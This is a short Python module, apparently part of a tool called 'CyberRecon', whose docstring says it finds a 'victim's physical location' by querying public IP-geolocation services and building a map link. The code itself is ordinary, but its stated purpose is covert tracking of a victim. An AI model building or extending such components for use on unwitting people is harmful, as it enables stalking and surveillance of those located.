"""
CyberRecon GPS Location Module
Determines victim's physical location via IP geolocation.
"""

import json
import urllib.request
from datetime import datetime


class GPSLocator:
    def __init__(self):
        self.services = [
            "https://ipapi.co/json/",
            "https://ipinfo.io/json",
            "https://ipwho.is/"
        ]

    def locate(self):
        for service in self.services:
            try:
                req = urllib.request.Request(service, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    data = json.loads(resp.read().decode())
                    return {
                        "timestamp": datetime.now().isoformat(),
                        "ip": data.get("ip") or data.get("query"),
                        "city": data.get("city"),
                        "region": data.get("region") or data.get("regionName"),
                        "country": data.get("country") or data.get("country_name"),
                        "latitude": data.get("latitude") or data.get("lat"),
                        "longitude": data.get("longitude") or data.get("lon"),
                        "isp": data.get("isp") or data.get("org"),
                        "timezone": data.get("timezone"),
                        "source": service
                    }
            except Exception:
                continue
        return {"error": "All geolocation services failed"}

    def get_map_link(self, lat, lon):
        return f"https://www.google.com/maps?q={lat},{lon}"
